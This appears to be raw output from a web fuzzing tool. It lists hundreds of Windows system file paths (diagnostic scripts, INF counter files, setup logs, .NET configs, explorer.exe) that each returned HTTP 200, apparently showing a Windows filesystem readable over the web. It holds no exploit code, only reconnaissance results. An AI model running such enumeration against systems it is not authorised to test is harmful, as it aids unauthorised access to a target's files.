000004079:   200        22 L     61 W       654 Ch      "Windows/diagnostics/system/Printer/TS_PaperJam.ps1"                                                   
000004076:   200        41 L     104 W      1100 Ch     "Windows/diagnostics/system/Printer/TS_NoPrinterInstalled.ps1"                                         
000004075:   200        35 L     155 W      1456 Ch     "Windows/diagnostics/system/Printer/TS_DefaultPrinter.ps1"                                             
000004074:   200        112 L    342 W      4208 Ch     "Windows/diagnostics/system/Printer/TS_CannotConnect.ps1"                                              
000004073:   200        29 L     110 W      1402 Ch     "Windows/diagnostics/system/Printer/RS_WrongDefaultPrinter.ps1"                                        
000004072:   200        28 L     120 W      1586 Ch     "Windows/diagnostics/system/Printer/RS_StartSpoolerService.ps1"                                        
000004069:   200        24 L     52 W       663 Ch      "Windows/diagnostics/system/Printer/RS_RestartSpoolerService.ps1"                                      
000004071:   200        48 L     142 W      2004 Ch     "Windows/diagnostics/system/Printer/RS_SpoolerCrashing.ps1"                                            
000004068:   200        53 L     132 W      1271 Ch     "Windows/diagnostics/system/Printer/RS_ProcessPrinterjobs.ps1"                                         
000004065:   200        40 L     89 W       1025 Ch     "Windows/diagnostics/system/Printer/RS_NoPrinterInstalled.ps1"                                         
000004067:   200        10 L     41 W       375 Ch      "Windows/diagnostics/system/Printer/RS_PrinterTurnedOff.ps1"                                           
000004085:   200        35 L     119 W      1391 Ch     "Windows/diagnostics/system/Printer/TS_SpoolerCrashing.ps1"                                            
000004087:   200        47 L     138 W      1314 Ch     "Windows/diagnostics/system/Printer/VF_PrinterTurnedOff.ps1"                                           
000004091:   200        18 L     54 W       548 Ch      "Windows/diagnostics/system/Search/RS_StartIndexingService.ps1"                                        
000004099:   200        1651 L   11315 W    97644 Ch    "Windows/diagnostics/system/Speech/CL_Utilities.ps1"                                                   
000004105:   200        87 L     325 W      4400 Ch     "Windows/diagnostics/system/Video/RC_viddrv_displaytopology.ps1"                                       
000004104:   200        39 L     77 W       1471 Ch     "Windows/diagnostics/system/Video/RC_aud_reg_settings.ps1"                                             
000004103:   200        709 L    2319 W     22018 Ch    "Windows/diagnostics/system/Video/CL_MutexVerifiers.ps1"                                               
000004102:   200        32 L     76 W       1042 Ch     "Windows/diagnostics/system/Speech/VF_CalibrationRequired.ps1"                                         
000004101:   200        101 L    222 W      3083 Ch     "Windows/diagnostics/system/Speech/RS_CalibrationRequired.ps1"                                         
000004098:   200        20 L     96 W       931 Ch      "Windows/diagnostics/system/Search/TS_ProtocolHostCrashing.ps1"                                        
000004100:   200        91 L     221 W      2898 Ch     "Windows/diagnostics/system/Speech/MF_SpeechDiagnostic.ps1"                                            
000004097:   200        20 L     95 W       909 Ch      "Windows/diagnostics/system/Search/TS_IndexingServiceCrashing.ps1"                                     
000004096:   200        46 L     213 W      2015 Ch     "Windows/diagnostics/system/Search/TS_IndexingService.ps1"                                             
000004095:   200        17 L     93 W       962 Ch      "Windows/diagnostics/system/Search/TS_ForcedShutdownNoCorruption.ps1"                                  
000004094:   200        17 L     93 W       945 Ch      "Windows/diagnostics/system/Search/TS_ForcedShutdownInRecovery.ps1"                                    
000004093:   200        20 L     96 W       913 Ch      "Windows/diagnostics/system/Search/TS_FilterHostCrashing.ps1"                                          
000004092:   200        57 L     239 W      2671 Ch     "Windows/diagnostics/system/Search/TS_CheckPermissions.ps1"                                            
000004090:   200        69 L     275 W      2484 Ch     "Windows/diagnostics/system/Search/RS_RestorePermissions.ps1"                                          
000004089:   200        22 L     73 W       838 Ch      "Windows/diagnostics/system/Search/RS_RestoreDefaults.ps1"                                             
000004086:   200        23 L     67 W       640 Ch      "Windows/diagnostics/system/Printer/TS_SpoolerService.ps1"                                             
000004088:   200        467 L    1501 W     20594 Ch    "Windows/diagnostics/system/Search/CL_Utility.ps1"                                                     
000004106:   200        47 L     93 W       1620 Ch     "Windows/diagnostics/system/Video/RC_viddrv_driverblocklist.ps1"                                       
000004108:   200        43 L     74 W       1411 Ch     "Windows/diagnostics/system/Video/RC_viddrv_hwdrmcheck.ps1"                                            
000004112:   200        22 L     39 W       956 Ch      "Windows/diagnostics/system/Video/RS_viddrv_displaytopology.ps1"                                       
000004120:   200        422 L    1355 W     14351 Ch    "Windows/diagnostics/system/Video/utils_SetupEnv.ps1"                                                  
000004127:   200        22 L     55 W       645 Ch      "Windows/diagnostics/system/WindowsMediaPlayerConfiguration/TS_IsWMPUnavailable.ps1"                   
000004126:   200        47 L     103 W      1129 Ch     "Windows/diagnostics/system/WindowsMediaPlayerConfiguration/RS_NetworkCacheCorrupted.ps1"              
000004125:   200        24 L     52 W       729 Ch      "Windows/diagnostics/system/WindowsMediaPlayerConfiguration/RS_ConfigurationErrors.ps1"                
000004124:   200        25 L     42 W       1103 Ch     "Windows/diagnostics/system/Video/VF_viddrv_unsigned.ps1"                                              
000004123:   200        23 L     42 W       1099 Ch     "Windows/diagnostics/system/Video/VF_viddrv_msvideo.ps1"                                               
000004122:   200        42 L     94 W       1523 Ch     "Windows/diagnostics/system/Video/VF_viddrv_driverblocklist.ps1"                                       
000004119:   200        33 L     61 W       838 Ch      "Windows/diagnostics/system/Video/TS_Main.ps1"                                                         
000004121:   200        26 L     60 W       1101 Ch     "Windows/diagnostics/system/Video/VF_aud_reg_settings.ps1"                                             
000004118:   200        22 L     44 W       978 Ch      "Windows/diagnostics/system/Video/RS_viddrv_unsigned.ps1"                                              
000004117:   200        22 L     36 W       911 Ch      "Windows/diagnostics/system/Video/RS_viddrv_msvideo.ps1"                                               
000004116:   200        21 L     33 W       894 Ch      "Windows/diagnostics/system/Video/RS_viddrv_hwdrmcheck.ps1"                                            
000004115:   200        21 L     33 W       898 Ch      "Windows/diagnostics/system/Video/RS_viddrv_hevccodeccheck.ps1"                                        
000004114:   200        22 L     38 W       942 Ch      "Windows/diagnostics/system/Video/RS_viddrv_genericfailure.ps1"                                        
000004111:   200        24 L     53 W       1165 Ch     "Windows/diagnostics/system/Video/RS_aud_reg_settings.ps1"                                             
000004113:   200        176 L    600 W      8647 Ch     "Windows/diagnostics/system/Video/RS_viddrv_driverblocklist.ps1"                                       
000004110:   200        72 L     208 W      2612 Ch     "Windows/diagnostics/system/Video/RC_viddrv_unsigned.ps1"                                              
000004107:   200        44 L     107 W      1637 Ch     "Windows/diagnostics/system/Video/RC_viddrv_hevccodeccheck.ps1"                                        
000004109:   200        43 L     85 W       1523 Ch     "Windows/diagnostics/system/Video/RC_viddrv_msvideo.ps1"                                               
000004128:   200        115 L    254 W      3054 Ch     "Windows/diagnostics/system/WindowsMediaPlayerConfiguration/TS_NetworkCacheCorrupted.ps1"              
000004130:   200        28 L     58 W       592 Ch      "Windows/diagnostics/system/WindowsMediaPlayerMediaLibrary/RS_MediaLibCorrupted.ps1"                   
000004134:   200        43 L     91 W       1084 Ch     "Windows/diagnostics/system/WindowsMediaPlayerPlayDVD/TS_DVDAudioDecoder.ps1"                          
000004142:   200        395 L    1132 W     13857 Ch    "Windows/diagnostics/system/WindowsUpdate/cl_windowsupdate.ps1"                                        
000004158:   200        105 L    341 W      3620 Ch     "Windows/diagnostics/system/WindowsUpdate/TS_Main.ps1"                                                 
000004167:   200        34 L     55 W       766 Ch      "Windows/Globalization/ELS/SpellDictionaries/Fluency/en-US/.config"                                    
000004165:   200        2 L      2 W        65 Ch       "Windows/Fonts/desktop.ini"                                                                            
000004163:   200        5 L      60 W       776 Ch      "Windows/DtcInstall.log"                                                                               
000004160:   200        37 L     91 W       1179 Ch     "Windows/diagnostics/system/WindowsUpdate/VF_GenWUError.ps1"                                           
000004161:   200        20 L     55 W       642 Ch      "Windows/diagnostics/system/WindowsUpdate/VF_Pendingupdates.ps1"                                       
000004157:   200        19 L     49 W       851 Ch      "Windows/diagnostics/system/WindowsUpdate/RS_WaaSMedic.ps1"                                            
000004159:   200        30 L     78 W       1103 Ch     "Windows/diagnostics/system/WindowsUpdate/VF_DataStore.ps1"                                            
000004156:   200        44 L     109 W      1189 Ch     "Windows/diagnostics/system/WindowsUpdate/RS_Pendingupdates.ps1"                                       
000004155:   200        5 L      23 W       224 Ch      "Windows/diagnostics/system/WindowsUpdate/RS_Pendingrestart.ps1"                                       
000004154:   200        98 L     244 W      4295 Ch     "Windows/diagnostics/system/WindowsUpdate/RS_GENWUError.ps1"                                           
000004153:   200        74 L     157 W      2141 Ch     "Windows/diagnostics/system/WindowsUpdate/RS_DateTime.ps1"                                             
000004168:   200        618 L    6299 W     95687 Ch    "Windows/Globalization/Time Zone/timezoneMapping.xml"                                                  
000004152:   200        188 L    455 W      5411 Ch     "Windows/diagnostics/system/WindowsUpdate/RS_DataStore.ps1"                                            
000004151:   200        12 L     36 W       574 Ch      "Windows/diagnostics/system/WindowsUpdate/RS_AppData.ps1"                                              
000004150:   200        40 L     100 W      1183 Ch     "Windows/diagnostics/system/WindowsUpdate/RC_WaaSMedic.ps1"                                            
000004149:   200        22 L     59 W       1007 Ch     "Windows/diagnostics/system/WindowsUpdate/RC_Pendingupdates.ps1"                                       
000004148:   200        24 L     55 W       957 Ch      "Windows/diagnostics/system/WindowsUpdate/RC_Pendingrestart.ps1"                                       
000004147:   200        97 L     229 W      2831 Ch     "Windows/diagnostics/system/WindowsUpdate/rc_genwuerror.ps1"                                           
000004146:   200        153 L    431 W      5113 Ch     "Windows/diagnostics/system/WindowsUpdate/RC_DateTime.ps1"                                             
000004145:   200        33 L     75 W       1034 Ch     "Windows/diagnostics/system/WindowsUpdate/RC_DataStore.ps1"                                            
000004144:   200        20 L     48 W       736 Ch      "Windows/diagnostics/system/WindowsUpdate/RC_appdata.ps1"                                              
000004141:   200        97 L     248 W      3175 Ch     "Windows/diagnostics/system/WindowsUpdate/CL_Utility.ps1"                                              
000004143:   200        194 L    517 W      7107 Ch     "Windows/diagnostics/system/WindowsUpdate/cl_windowsversion.ps1"                                       
000004140:   200        174 L    370 W      5238 Ch     "Windows/diagnostics/system/WindowsUpdate/CL_SetupEnv.ps1"                                             
000004139:   200        140 L    335 W      4413 Ch     "Windows/diagnostics/system/WindowsUpdate/cl_Service.ps1"                                              
000004138:   200        72 L     167 W      1928 Ch     "Windows/diagnostics/system/WindowsMediaPlayerPlayDVD/TS_WindowsMediaPlayer.ps1"                       
000004137:   200        22 L     55 W       645 Ch      "Windows/diagnostics/system/WindowsMediaPlayerPlayDVD/TS_IsWMPUnavailable.ps1"                         
000004136:   200        41 L     93 W       1082 Ch     "Windows/diagnostics/system/WindowsMediaPlayerPlayDVD/TS_DVDVideoDecoder.ps1"                          
000004133:   200        6 L      15 W       139 Ch      "Windows/diagnostics/system/WindowsMediaPlayerPlayDVD/RS_DvdDecoder.ps1"                               
000004135:   200        32 L     81 W       1204 Ch     "Windows/diagnostics/system/WindowsMediaPlayerPlayDVD/TS_DVDDevice.ps1"                                
000004169:   200        5310 L   33092 W    428828 Ch   "Windows/Globalization/Time Zone/timezones.xml"                                                        
000004162:   200        967 L    1722 W     667214 Ch   "Windows/DiagTrack/Scenarios/windows.uif_ondemand.xml"                                                 
000004129:   200        33 L     76 W       838 Ch      "Windows/diagnostics/system/WindowsMediaPlayerConfiguration/TS_WindowsMediaPlayer.ps1"                 
000004132:   200        19 L     46 W       471 Ch      "Windows/diagnostics/system/WindowsMediaPlayerMediaLibrary/TS_WindowsMediaPlayer.ps1"                  
000004131:   200        22 L     55 W       645 Ch      "Windows/diagnostics/system/WindowsMediaPlayerMediaLibrary/TS_IsWMPUnavailable.ps1"                    
000004170:   200        4 L      90 W       12975 Ch    "Windows/IdentityCRL/INT/wlidsvcconfig.xml"                                                            
000004176:   200        1 L      12 W       319 Ch      "Windows/ImmersiveControlPanel/appxblockmap.xml"                                                       
000004191:   200        2 L      2 W        36 Ch       "Windows/INF/.NETFramework/0000/corperfmonsymbols_d.ini"                                               
000004184:   200        2 L      2 W        45 Ch       "Windows/INF/.NET CLR Networking/0000/_Networkingperfcounters_v2_d.ini"                                
000004190:   200        39 L     117 W      1288 Ch     "Windows/INF/.NET Memory Cache 4.0/netmemorycache.ini"                                                 
000004189:   200        2 L      2 W        33 Ch       "Windows/INF/.NET Memory Cache 4.0/0000/netmemorycache_d.ini"                                          
000004188:   200        2 L      2 W        53 Ch       "Windows/INF/.NET Data Provider for SqlServer/0000/_dataperfcounters_shared12_neutral_d.ini"           
000004187:   200        1183 L   4591 W     98692 Ch    "Windows/INF/.NET Data Provider for SqlServer/_dataperfcounters_shared12_neutral.ini"                  
000004186:   200        2 L      2 W        65 Ch       "Windows/INF/.NET Data Provider for Oracle/0000/_DataOracleClientPerfCounters_shared12_neutral_d.ini"  
000004183:   200        522 L    3242 W     52778 Ch    "Windows/INF/.NET CLR Networking/_Networkingperfcounters_v2.ini"                                       
000004182:   200        2 L      2 W        42 Ch       "Windows/INF/.NET CLR Networking 4.0.0.0/0000/_Networkingperfcounters_d.ini"                           
000004180:   200        2 L      2 W        36 Ch       "Windows/INF/.NET CLR Data/0000/_DataPerfCounters_d.ini"                                               
000004179:   200        627 L    3304 W     54198 Ch    "Windows/INF/.NET CLR Data/_DataPerfCounters.ini"                                                      
000004185:   200        1183 L   4595 W     98640 Ch    "Windows/INF/.NET Data Provider for Oracle/_DataOracleClientPerfCounters_shared12_neutral.ini"         
000004177:   200        58 L     83 W       2443 Ch     "Windows/ImmersiveControlPanel/appxmanifest.xml"                                                       
000004171:   200        4 L      90 W       12695 Ch    "Windows/IdentityCRL/production/wlidsvcconfig.xml"                                                     
000004206:   200        2 L      2 W        49 Ch       "Windows/INF/MSDTC Bridge 3.0.0.0/0000/_TransactionBridgePerfCounters_D.ini"                           
000004233:   200        1 L      2 W        39 Ch       "Windows/INF/SMSvcHost 4.0.0.0/0000/_SMSvcHostPerfCounters_d.ini"                                      
000004231:   200        2 L      2 W        41 Ch       "Windows/INF/SMSvcHost 3.0.0.0/0409/_SMSvcHostPerfCounters_D.ini"                                      
000004230:   200        2 L      2 W        41 Ch       "Windows/INF/SMSvcHost 3.0.0.0/0000/_SMSvcHostPerfCounters_D.ini"                                      
000004229:   200        1171 L   5976 W     132215 Ch   "Windows/INF/SMSvcHost 3.0.0.0/_SMSvcHostPerfCounters.ini"                                             
000004232:   200        1171 L   6096 W     133817 Ch   "Windows/INF/SMSvcHost 4.0.0.0/_SMSvcHostPerfCounters.ini"                                             
000004224:   200        2 L      2 W        51 Ch       "Windows/INF/ServiceModelService 3.0.0.0/0409/_ServiceModelServicePerfCounters_D.ini"                  
000004221:   200        2 L      2 W        53 Ch       "Windows/INF/ServiceModelOperation 3.0.0.0/0409/_ServiceModelOperationPerfCounters_D.ini"              
000004223:   200        2 L      2 W        51 Ch       "Windows/INF/ServiceModelService 3.0.0.0/0000/_ServiceModelServicePerfCounters_D.ini"                  
000004222:   200        2571 L   17487 W    559176 Ch   "Windows/INF/ServiceModelService 3.0.0.0/_ServiceModelServicePerfCounters.ini"                         
000004220:   200        2 L      2 W        53 Ch       "Windows/INF/ServiceModelOperation 3.0.0.0/0000/_ServiceModelOperationPerfCounters_D.ini"              
000004218:   200        2 L      2 W        52 Ch       "Windows/INF/ServiceModelEndpoint 3.0.0.0/0409/_ServiceModelEndpointPerfCounters_D.ini"                
000004217:   200        2 L      2 W        52 Ch       "Windows/INF/ServiceModelEndpoint 3.0.0.0/0000/_ServiceModelEndpointPerfCounters_D.ini"                
000004219:   200        1243 L   6944 W     244769 Ch   "Windows/INF/ServiceModelOperation 3.0.0.0/_ServiceModelOperationPerfCounters.ini"                     
000004214:   200        86 L     567 W      6918 Ch     "Windows/INF/RemoteAccess/0000/rasctrs.ini"                                                            
000004216:   200        1543 L   9144 W     315133 Ch   "Windows/INF/ServiceModelEndpoint 3.0.0.0/_ServiceModelEndpointPerfCounters.ini"                       
000004213:   200        49 L     291 W      4344 Ch     "Windows/INF/rdyboost/0409/ReadyBoostPerfCounters.ini"                                                 
000004178:   200        17014    19238 W    909977 Ch   "Windows/ImmersiveControlPanel/Settings/AllSystemSettings_{253E530E-387D-4BC2-959D-E6F86122E5F2}.xml"  
                        L                                                                                                                                      
000004212:   200        49 L     291 W      4284 Ch     "Windows/INF/rdyboost/0000/ReadyBoostPerfCounters.ini"                                                 
000004228:   200        1242 L   7279 W     99264 Ch    "Windows/INF/setupapi.setup.log"                                                                       
000004211:   200        39 L     174 W      3864 Ch     "Windows/INF/MSDTC/0409/msdtcprf.ini"                                                                  
000004181:   200        1154 L   9596 W     166284 Ch   "Windows/INF/.NET CLR Networking 4.0.0.0/_Networkingperfcounters.ini"                                  
000004210:   200        39 L     174 W      3864 Ch     "Windows/INF/MSDTC/0000/msdtcprf.ini"                                                                  
000004209:   200        1 L      2 W        47 Ch       "Windows/INF/MSDTC Bridge 4.0.0.0/0000/_TransactionBridgePerfCounters_d.ini"                           
000004215:   200        86 L     567 W      6918 Ch     "Windows/INF/RemoteAccess/0409/rasctrs.ini"                                                            
000004207:   200        2 L      2 W        49 Ch       "Windows/INF/MSDTC Bridge 3.0.0.0/0409/_TransactionBridgePerfCounters_D.ini"                           
000004204:   200        28 L     132 W      2078 Ch     "Windows/INF/LSM/0409/lagcounterdef.ini"                                                               
000004203:   200        28 L     132 W      1878 Ch     "Windows/INF/LSM/0000/lagcounterdef.ini"                                                               
000004208:   200        959 L    5804 W     135726 Ch   "Windows/INF/MSDTC Bridge 4.0.0.0/_TransactionBridgePerfCounters.ini"                                  
000004205:   200        959 L    5607 W     131650 Ch   "Windows/INF/MSDTC Bridge 3.0.0.0/_TransactionBridgePerfCounters.ini"                                  
000004200:   200        29 L     143 W      2770 Ch     "Windows/INF/BITS/0409/bitsctrs.ini"                                                                   
000004199:   200        28 L     141 W      2766 Ch     "Windows/INF/BITS/0000/bitsctrs.ini"                                                                   
000004234:   200        38 L     176 W      2724 Ch     "Windows/INF/TAPISRV/0000/tapiperf.ini"                                                                
000004236:   200        31 L     99 W       1060 Ch     "Windows/INF/TermService/0000/tslabels.ini"                                                            
000004240:   200        229 L    1995 W     31698 Ch    "Windows/INF/UGTHRSVC/0000/gthrctr.ini"                                                                
000004227:   200        22366    134558 W   2091344 C   "Windows/INF/setupapi.offline.log"                                                                     
                        L                   h                                                                                                                  
000004248:   200        1668 L   6969 W     154185 Ch   "Windows/INF/Windows Workflow Foundation 4.0.0.0/PerfCounters.ini"                                     
000004258:   200        171 L    366 W      13658 Ch    "Windows/Logs/MoSetup/DeviceInventory.xml"                                                             
000004257:   200        14 L     41 W       1145 Ch     "Windows/Logs/MoSetup/ActionList.xml"                                                                  
000004256:   200        0 L      0 W        0 Ch        "Windows/Logs/DPX/setuperr.log"                                                                        
000004192:   200        6486 L   99702 W    1514778 C   "Windows/INF/.NETFramework/corperfmonsymbols.ini"                                                      
                                            h                                                                                                                  
000004254:   200        810 L    10483 W    122831 Ch   "Windows/Logs/DISM/dism.log"                                                                           
000004255:   200        5462 L   61642 W    525418 Ch   "Windows/Logs/DPX/setupact.log"                                                                        
000004252:   200        150 L    981 W      20698 Ch    "Windows/INF/wsearchidxpi/0409/idxcntrs.ini"                                                           
000004251:   200        150 L    981 W      20698 Ch    "Windows/INF/wsearchidxpi/0000/idxcntrs.ini"                                                           
000004250:   200        352 L    2231 W     39002 Ch    "Windows/INF/WmiApRpl/WmiApRpl.ini"                                                                    
000004247:   200        2 L      2 W        31 Ch       "Windows/INF/Windows Workflow Foundation 4.0.0.0/0000/PerfCounters_d.ini"                              
000004249:   200        352 L    2231 W     39002 Ch    "Windows/INF/WmiApRpl/0009/WmiApRpl.ini"                                                               
000004202:   200        3583 L   53878 W    854534 Ch   "Windows/INF/ESENT/0409/esentprf.ini"                                                                  
000004245:   200        2 L      2 W        31 Ch       "Windows/INF/Windows Workflow Foundation 3.0.0.0/0409/PerfCounters_D.ini"                              
000004244:   200        2 L      2 W        31 Ch       "Windows/INF/Windows Workflow Foundation 3.0.0.0/0000/PerfCounters_D.ini"                              
000004243:   200        66 L     361 W      5982 Ch     "Windows/INF/usbhub/0409/usbperf.ini"                                                                  
000004225:   200        31599    197411 W   2688731 C   "Windows/INF/setupapi.dev.log"                                                                         
                        L                   h                                                                                                                  
000004242:   200        66 L     361 W      5982 Ch     "Windows/INF/usbhub/0000/usbperf.ini"                                                                  
000004246:   200        1740 L   6641 W     153207 Ch   "Windows/INF/Windows Workflow Foundation 3.0.0.0/PerfCounters.ini"                                     
000004239:   200        262 L    1817 W     30628 Ch    "Windows/INF/UGatherer/0409/gsrvctr.ini"                                                               
000004241:   200        229 L    1995 W     31698 Ch    "Windows/INF/UGTHRSVC/0409/gthrctr.ini"                                                                
000004238:   200        262 L    1817 W     30628 Ch    "Windows/INF/UGatherer/0000/gsrvctr.ini"                                                               
000004164:   200        15512    136357 W   4783107 C   "windows/explorer.exe"                                                                                 
                        L                   h                                                                                                                  
000004235:   200        38 L     176 W      2724 Ch     "Windows/INF/TAPISRV/0409/tapiperf.ini"                                                                
000004298:   200        30 L     94 W       1734 Ch     "Windows/Microsoft.NET/assembly/GAC_64/MSBuild/v4.0_4.0.0.0__b03f5f7f11d50a3a/msbuild.exe.config"      
000004237:   200        31 L     99 W       1060 Ch     "Windows/INF/TermService/0409/tslabels.ini"                                                            
000004304:   200        17 L     75 W       936 Ch      "Windows/Microsoft.NET/assembly/GAC_MSIL/Policy.1.0.Microsoft.PowerShell.Commands.Utility/v4.0_1.0.0.0_
                                                        _31bf3856ad364e35/Policy.1.0.Microsoft.Powershell.Commands.Utility.config"                             
000004303:   200        17 L     75 W       945 Ch      "Windows/Microsoft.NET/assembly/GAC_MSIL/Policy.1.0.Microsoft.PowerShell.Commands.Management/v4.0_1.0.0
                                                        .0__31bf3856ad364e35/Policy.1.0.Microsoft.Powershell.Commands.Management.config"                       
000004301:   200        13 L     47 W       893 Ch      "Windows/Microsoft.NET/assembly/GAC_MSIL/dfsvc/v4.0_4.0.0.0__b03f5f7f11d50a3a/dfsvc.exe.config"        
000004297:   200        53 L     97 W       1678 Ch     "Windows/Microsoft.NET/assembly/GAC_64/Microsoft.ConfigCI.Commands/v4.0_10.0.0.0__31bf3856ad364e35/Deny
                                                        AllAudit.xml"                                                                                          
000004302:   200        1 L      1 W        32 Ch       "Windows/Microsoft.NET/assembly/GAC_MSIL/Microsoft.Security.ApplicationId.PolicyManagement.XmlHelper"  
000004296:   200        262 L    794 W      10949 Ch    "Windows/Microsoft.NET/assembly/GAC_64/Microsoft.ConfigCI.Commands/v4.0_10.0.0.0__31bf3856ad364e35/Defa
                                                        ultWindows_Enforced.xml"                                                                               
000004295:   200        265 L    796 W      11010 Ch    "Windows/Microsoft.NET/assembly/GAC_64/Microsoft.ConfigCI.Commands/v4.0_10.0.0.0__31bf3856ad364e35/Defa
                                                        ultWindows_Audit.xml"                                                                                  
000004294:   200        171 L    431 W      7040 Ch     "Windows/Microsoft.NET/assembly/GAC_64/Microsoft.ConfigCI.Commands/v4.0_10.0.0.0__31bf3856ad364e35/Allo
                                                        wMicrosoft.xml"                                                                                        
000004293:   200        61 L     111 W      1954 Ch     "Windows/Microsoft.NET/assembly/GAC_64/Microsoft.ConfigCI.Commands/v4.0_10.0.0.0__31bf3856ad364e35/Allo
                                                        wAll.xml"                                                                                              
000004292:   200        64 L     117 W      2052 Ch     "Windows/Microsoft.NET/assembly/GAC_64/Microsoft.ConfigCI.Commands/v4.0_10.0.0.0__31bf3856ad364e35/Allo
                                                        wAll_EnableHVCI.xml"                                                                                   
000004289:   200        30 L     94 W       1734 Ch     "Windows/Microsoft.NET/assembly/GAC_32/MSBuild/v4.0_4.0.0.0__b03f5f7f11d50a3a/msbuild.exe.config"      
000004305:   200        17 L     75 W       921 Ch      "Windows/Microsoft.NET/assembly/GAC_MSIL/Policy.1.0.Microsoft.PowerShell.ConsoleHost/v4.0_1.0.0.0__31bf
                                                        3856ad364e35/Policy.1.0.Microsoft.Powershell.ConsoleHost.config"                                       
000004307:   200        17 L     75 W       909 Ch      "Windows/Microsoft.NET/assembly/GAC_MSIL/Policy.1.0.System.Management.Automation/v4.0_1.0.0.0__31bf3856
                                                        ad364e35/Policy.1.0.System.Management.Automation.config"                                               
000004311:   200        1 L      1 W        31 Ch       "Windows/Microsoft.NET/assembly/GAC_MSIL/System.Xml"                                                   
000004319:   200        9 L      17 W       317 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/ASP.NETWebAdminFiles/App_Data/GroupedProviders.xml"        
000004323:   200        7 L      12 W       205 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/Aspnet_regsql.exe.config"                                  
000004318:   200        11 L     19 W       353 Ch      "Windows/Microsoft.NET/Framework/v1.1.4322/regsvcs.exe.config"                                         
000004320:   200        21 L     32 W       716 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/ASP.NETWebAdminFiles/web.config"                           
000004317:   200        6 L      10 W       140 Ch      "Windows/Microsoft.NET/Framework/v1.1.4322/gacutil.exe.config"                                         
000004316:   200        11 L     18 W       351 Ch      "Windows/Microsoft.NET/Framework/v1.0.3705/regsvcs.exe.config"                                         
000004201:   200        3583 L   53878 W    854534 Ch   "Windows/INF/ESENT/0000/esentprf.ini"                                                                  
000004315:   200        80 L     174 W      5201 Ch     "Windows/Microsoft.NET/Framework/v1.0.3705/mscormmc.cfg"                                               
000004314:   200        12 L     18 W       353 Ch      "Windows/Microsoft.NET/Framework/v1.0.3705/installutil.exe.config"                                     
000004313:   200        1 L      1 W        31 Ch       "Windows/Microsoft.NET/assembly/GAC_MSIL/System.Xml.XmlSerializer"                                     
000004310:   200        1 L      1 W        31 Ch       "Windows/Microsoft.NET/assembly/GAC_MSIL/System.Runtime.Serialization.Xml"                             
000004312:   200        1 L      1 W        31 Ch       "Windows/Microsoft.NET/assembly/GAC_MSIL/System.Xml.XmlDocument"                                       
000004309:   200        1 L      1 W        31 Ch       "Windows/Microsoft.NET/assembly/GAC_MSIL/System.IO.Log"                                                
000004306:   200        17 L     75 W       912 Ch      "Windows/Microsoft.NET/assembly/GAC_MSIL/Policy.1.0.Microsoft.PowerShell.Security/v4.0_1.0.0.0__31bf385
                                                        6ad364e35/Policy.1.0.Microsoft.Powershell.Security.config"                                             
000004308:   200        17 L     73 W       918 Ch      "Windows/Microsoft.NET/assembly/GAC_MSIL/Policy.3.0.Microsoft.BackgroundIntelligentTransfer.Management/
                                                        v4.0_10.0.0.0__31bf3856ad364e35/Policy.3.0.Microsoft.BackgroundIntelligentTransfer.Management.config"  
000004326:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/caspol.exe.config"                                         
000004330:   200        69 L     311 W      8260 Ch     "Windows/Microsoft.NET/Framework/v2.0.50727/CONFIG/web_mediumtrust.config"                             
000004338:   200        63 L     547 W      11143 Ch    "Windows/Microsoft.NET/Framework/v2.0.50727/RedistList/FrameworkList.xml"                              
000004344:   200        6 L      10 W       161 Ch      "Windows/Microsoft.NET/Framework/v3.0/WPF/PresentationFontCache.exe.config"                            
000004343:   200        49 L     107 W      1951 Ch     "Windows/Microsoft.NET/Framework/v3.0/Windows Communication Foundation/SMSvcHost.exe.config"           
000004324:   200        430 L    1675 W     39634 Ch    "Windows/Microsoft.NET/Framework/v2.0.50727/aspnet_state_perf.ini"                                     
000004342:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/vbc.exe.config"                                            
000004341:   200        31 L     238 W      4631 Ch     "Windows/Microsoft.NET/Framework/v2.0.50727/SubsetList/Client.xml"                                     
000004340:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/regsvcs.exe.config"                                        
000004337:   200        14 L     24 W       559 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/msbuild.exe.config"                                        
000004339:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/regasm.exe.config"                                         
000004336:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/jsc.exe.config"                                            
000004334:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/ieexec.exe.config"                                         
000004335:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/ilasm.exe.config"                                          
000004333:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/csc.exe.config"                                            
000004332:   200        339 L    1153 W     32780 Ch    "Windows/Microsoft.NET/Framework/v2.0.50727/CONFIG/web.config"                                         
000004329:   200        125 L    229 W      8176 Ch     "Windows/Microsoft.NET/Framework/v2.0.50727/CONFIG/web_lowtrust.config"                                
000004331:   200        110 L    203 W      7122 Ch     "Windows/Microsoft.NET/Framework/v2.0.50727/CONFIG/web_minimaltrust.config"                            
000004328:   200        70 L     330 W      8692 Ch     "Windows/Microsoft.NET/Framework/v2.0.50727/CONFIG/web_hightrust.config"                               
000004325:   200        9 L      18 W       323 Ch      "Windows/Microsoft.NET/Framework/v2.0.50727/Aspnet.config"                                             
000004327:   200        195 L    1037 W     26035 Ch    "Windows/Microsoft.NET/Framework/v2.0.50727/CONFIG/machine.config"                                     
000004345:   200        7 L      11 W       158 Ch      "Windows/Microsoft.NET/Framework/v3.5/AddInProcess.exe.config"                                         
000004347:   200        7 L      11 W       158 Ch      "Windows/Microsoft.NET/Framework/v3.5/AddInUtil.exe.config"                                            
000004321:   200        7196 L   40185 W    818852 Ch   "Windows/Microsoft.NET/Framework/v2.0.50727/aspnet_perf.ini"                                           
000004351:   200        28 L     74 W       1581 Ch     "Windows/Microsoft.NET/Framework/v3.5/msbuild.exe.config"                                              
000004375:   200        82 L     143 W      4962 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/Config/web_minimaltrust.config"                            
000004385:   200        30 L     94 W       1734 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/msbuild.exe.config"                                        
